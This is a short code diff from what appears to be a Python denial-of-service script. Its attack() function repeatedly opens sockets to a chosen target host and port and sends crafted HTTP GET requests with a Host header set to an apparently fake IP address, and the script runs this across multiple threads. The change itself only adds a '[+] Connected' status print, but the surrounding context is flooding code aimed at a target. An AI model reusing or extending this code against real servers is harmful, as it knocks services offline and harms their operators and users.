@@ -38,6 +38,7 @@ def attack():
         s.sendto(("GET" + args.target + " HTTP/1.1\r\n").encode('ascii'), (args.target, args.port))
         s.sendto(("Host: " + fip + "\r\n\r\n").encode('ascii'), (args.target, args.port))
         s.close()
+        print("[+] Connected\t")
 
 
 # Running multiple threads
